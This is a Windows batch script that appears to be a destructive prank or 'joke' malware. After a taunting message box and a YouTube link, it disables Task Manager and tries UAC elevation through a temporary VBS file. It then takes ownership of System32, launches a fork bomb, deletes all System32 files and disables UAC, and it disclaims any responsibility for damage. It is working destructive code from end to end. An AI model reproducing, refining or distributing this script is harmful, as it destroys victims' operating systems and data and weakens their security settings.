@echo off 
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; $result = [System.Windows.Forms.MessageBox]::Show('Error: ARE YOU AN IDIOT', 'Error', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Error); if ($result -eq [System.Windows.Forms.DialogResult]::Yes -or $result -eq [System.Windows.Forms.DialogResult]::No) {Write-Host 'You clicked Yes.'}}"
set /p input=
if /i %input%==yes goto yes
if /i %input%==no goto no
if /i not %input%== yes,no goto 1

:yes
@echo "Yeah you really are LOL see you later!! (im not responsible for any damages done!!"
timeout /t 3 NOBREAK > nul 
exit
:no 
@echo you really think you aren't... lol THINK AGAIN!!!
timeout /t 5 NOBREAK > nul 
start https://www.youtube.com/watch?v=48rz8udZBmQ
timeout /t 6 NOBREAK >nul 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
REM Check if running with admin privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Running with administrator privileges
    set "admin=1"
) else (
    echo Not running with administrator privileges. Attempting to elevate...
    set "admin=0"
)

REM If not running with admin privileges, elevate
if "%admin%"=="0" (
    echo Elevating privileges...
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
        echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
        "%temp%\getadmin.vbs"
        del "%temp%\getadmin.vbs"
        exit /B
    )
    echo Successfully elevated privileges!
)

echo Prepare for total doom...
echo.
echo.

REM Take ownership of System32
takeown /f C:\Windows\System32 /r /d y
icacls C:\Windows\System32 /grant administrators:F /t
cd C:\Windows\System32

REM Delete System32
pause 
%0|%0
timeout /t 2 NOBREAK > nul
del /F /S /Q *.*

%windir%\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f


